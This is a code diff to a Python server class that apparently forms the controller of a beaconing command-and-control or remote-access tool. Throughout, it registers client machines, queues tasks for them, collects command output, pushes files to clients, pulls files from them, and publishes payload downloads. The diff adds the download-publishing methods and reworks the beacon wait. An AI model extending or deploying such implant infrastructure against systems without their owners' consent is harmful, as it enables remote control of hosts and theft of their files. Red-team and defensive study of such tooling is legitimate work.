@@ -1,5 +1,6 @@
 import uuid
 import base64
+from pathlib import Path
 from collections import deque
 from threading import Lock, Condition
 
@@ -7,8 +8,10 @@ class Server:
     def __init__(self):
         self.clients = {}
         self.task_meta = {}
+        self.downloads = {}
+        self.download_dir = Path(__file__).parent.parent / "downloads"
         self.lock = Lock()
- 
+        
     def identify(self, hostname, mac):
         client_id = str(uuid.uuid4())
 
@@ -23,33 +26,19 @@ class Server:
 
         print(f"[+] connected {hostname} ({client_id})")
         return {"status": "ok", "client_id": client_id}
+    
+    def get_client(self, client_id):
+        client = self.clients.get(client_id)
+        if not client:
+            raise Exception("unknown client")
+        return client
 
     def beacon(self, client_id, timeout=60):
         with self.lock:
             client = self.get_client(client_id)
-            cond = client["condition"]
-
-            while not client["tasks"]:
-                cond.wait(timeout)
-                break
-
+            client["condition"].wait_for(lambda: client["tasks"], timeout)
             task = client["tasks"].popleft() if client["tasks"] else None
             return {"task": task}
-    
-    def upload_file(self, client_id, local_path, remote_path):
-        with open(local_path, "rb") as f:
-            data = base64.b64encode(f.read()).decode()
-            
-        self.send_task(client_id, "upload", {
-            "path": remote_path,
-            "data": data
-        })
-    
-    def download_file(self, client_id, remote_path, local_path):
-        self.send_task(client_id, "download",
-            params = {"path": remote_path},
-            meta = {"local_path": local_path}
-        )
 
     def enqueue(self, client_id, task):
         with self.lock:
@@ -57,12 +46,6 @@ class Server:
             client["tasks"].append(task)
             client["condition"].notify()
 
-    def get_client(self, client_id):
-        client = self.clients.get(client_id)
-        if not client:
-            raise Exception("unknown client")
-        return client
- 
     def create_task(self, method, params=None):
         return {
             "id": str(uuid.uuid4()),
@@ -98,3 +81,30 @@ class Server:
         output = out["stdout"] if status == "ok" else out["stderr"]
         if output:
             print(f" {output}")
+
+    def upload_file(self, client_id, local_path, remote_path):
+        with open(local_path, "rb") as f:
+            data = base64.b64encode(f.read()).decode()
+            
+        self.send_task(client_id, "upload", {
+            "path": remote_path,
+            "data": data
+        })
+    
+    def download_file(self, client_id, remote_path, local_path):
+        self.send_task(client_id, "download",
+            params = {"path": remote_path},
+            meta = {"local_path": local_path}
+        )
+    
+    def publish_download(self, name):
+        path = self.download_dir / name
+        if not path.exists():
+            raise FileNotFoundError(f"file not found: {name}")
+        self.downloads[name] = path
+    
+    def get_publish_download(self, name):
+        path = self.downloads.get(name)
+        if not path:
+            raise FileNotFoundError(f"file not found: {name}") 
+        return Path(path)
